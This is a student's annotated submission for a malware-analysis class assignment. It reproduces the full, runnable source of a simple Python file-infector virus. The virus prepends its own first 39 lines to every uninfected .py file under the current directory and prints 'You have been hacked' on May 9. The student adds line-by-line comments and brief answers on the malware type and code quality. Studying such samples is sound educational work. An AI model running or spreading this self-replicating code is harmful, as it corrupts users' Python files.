# Script Name:                  Python Malware Analysis
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      06/16/2023
# Purpose:                      Copy the below Python script to your public GitHub repo. 
#                               Do not execute this script in your Ubuntu VM used for class. 
#                               If you wish to execute this script, either backup your VM using VirtualBox
#                               Snapshot or create a separate VM for testing.




# shebang Line tells the OS which interpreter to use to run the script
#!/usr/bin/python3

# Imports the OS module, which provides access to OS functionality
import os
# Imports the datetime module from the Python standard library and provides classes and functions for working with dates and times.
import datetime

#  Virus Signature Detection
SIGNATURE = "VIRUS"

# Looks for files to infect in the provided path
def locate(path):
    # Variable given an empty list to begin with
    files_targeted = []
    # Retrieve files within specified path
    filelist = os.listdir(path)
    # Loop to run commands in the filelist
    for fname in filelist:
        # Check path, if true execute
        if os.path.isdir(path+"/"+fname):
            # List on path extends new elements to the file
            files_targeted.extend(locate(path+"/"+fname))
        # alternative condition, if true files end in .py, execute code block
        elif fname[-3:] == ".py":
            # default infected is false
            infected = False
            # loop and look in each line of file
            for line in open(path+"/"+fname):
                # look for the signature virus line
                if SIGNATURE in line:
                    # to check if virus is on the file
                    infected = True
                    # exit
                    break
            # to check if virus is not on the file
            if infected == False:
                # the file path is added to the file target
                files_targeted.append(path+"/"+fname)
    # exit current function
    return files_targeted
# A function to infect the locate function above
def infect(files_targeted):
    # Open the virus script
    virus = open(os.path.abspath(__file__))
    # variable is empty
    virusstring = ""
    # Process each line in the virus script file 
    for i,line in enumerate(virus):
        # if line is greater than 0 but less than 39
        if 0 <= i < 39:
            # add virus to the line
            virusstring += line
    # close the virus string
    virus.close
    # loop and perform a set of actions
    for fname in files_targeted:
        # open to read file
        f = open(fname)
        # place the current file into a temp variable
        temp = f.read()
        # close the file
        f.close()
        # open and write file
        f = open(fname,"w")
        # write the viure string onto the temp file
        f.write(virusstring + temp)
        # close the file
        f.close()
# For when function is called perform block of code
def detonate():
    # If the date is May 9
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        #execute print statement
        print("You have been hacked")
# Target files in current directory of virus script
files_targeted = locate(os.path.abspath(""))
# Infect the target files
infect(files_targeted)
# Run the detonate function
detonate()



# Perform an analysis of the Python-based code.                        
#   Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#   Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#   Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
#   Stretch Goals (Optional Objectives)
#   Pursue stretch goals if you are a more advanced user or have remaining lab time.
#   
#   In your submission, include comments towards the bottom explaining the below:
#   
#   Identify all the core Python/coding tools used by this script, e.g. functions.
#   1. What kind of malware is this? Define this type of malware in your own words.
#       It is a malware that only infects files that end in .py extention (python) and it is to be executed on the date of May 9

#   2. How well is this code written? Would you have done something differently to achieve the same objective?
#       I think this code is not 100% great it didnt properly close the read and write files
#   3. How long you spent working on this assignment
#       Only took me around an hour to download the appropriate programming language and code editors and have everything in a contained vm enviroment